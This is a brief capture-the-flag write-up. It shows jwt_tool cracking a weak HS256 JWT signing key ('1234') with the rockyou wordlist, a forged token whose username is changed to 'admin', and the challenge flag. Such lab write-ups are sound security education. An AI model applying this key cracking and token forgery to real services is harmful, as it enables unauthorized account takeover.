A simple challenge using a weak signing key for JWT
```
(jwt_env) ┌─[nguyenlong05@sw1mj3llyf1sh] - [~/tempf/jwt_tool] - [Fri Jan 31, 20:01]
└─[$] <git:(master*)> python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJleHAiOjE3MzgzMjg3MzV9.k4jhGcTP2KwQ5emTzMCBUhu8Qav_-f_7erap0uZRK2c -C -d rockyou.txt 

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.7                \______|             @ticarpi      

Original JWT: 

[+] 1234 is the CORRECT key!
You can tamper/fuzz the token contents (-T/-I) and sign it using:
python3 jwt_tool.py [options here] -S hs256 -p "1234"
```

Payload:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzM4MzI4NzM1fQ.C0TUwx6FT-1pRp41WGetAySQa-tle7-ekM9yg4FDblw
```

Flag:`ectf{JwT_T0keN_cR34t0r}`